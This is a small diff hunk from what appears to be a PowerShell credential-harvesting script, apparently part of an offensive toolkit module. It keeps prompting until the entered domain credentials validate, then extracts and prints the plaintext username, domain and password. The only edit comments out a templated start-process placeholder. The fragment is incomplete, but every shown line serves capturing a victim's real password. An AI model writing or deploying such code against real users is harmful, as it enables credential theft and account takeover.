@@ -18,5 +18,5 @@ while($DS.ValidateCredentials("$full","$password") -ne $True){
     }
  $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
  $output
- R{START_PROCESS}
+ #R{START_PROCESS}
 }
